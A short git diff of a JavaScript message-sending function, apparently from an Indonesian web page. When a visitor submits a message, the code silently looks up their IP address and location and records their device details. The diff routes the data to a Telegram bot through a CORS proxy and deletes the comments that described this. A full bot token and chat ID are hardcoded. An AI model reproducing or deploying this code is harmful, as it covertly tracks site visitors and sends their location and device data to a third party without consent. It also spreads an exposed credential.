@@ -3,7 +3,6 @@ async function kirim() {
   if (!pesan.trim()) return alert("Pesan tidak boleh kosong!");
 
   try {
-    // Ambil IP & Lokasi
     const ip = await fetch("https://ipapi.co/json/").then(res => res.json());
 
     const hasil = `
@@ -19,12 +18,11 @@ async function kirim() {
 🖥️ *Device*: ${navigator.userAgent}
     `;
 
-    // Kirim ke Bot Telegram
-    await fetch(`https://api.telegram.org/bot7787813252:AAHDuYArq78QFXqSSw-66L8oCO9qACyFnZk/sendMessage`, {
+    await fetch("https://corsproxy.io/?https://api.telegram.org/bot7787813252:AAHDuYArq78QFXqSSw-66L8oCO9qACyFnZk/sendMessage", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        chat_id: "7607549215",
+        chat_id: 7607549215,
         text: hasil,
         parse_mode: "Markdown"
       })
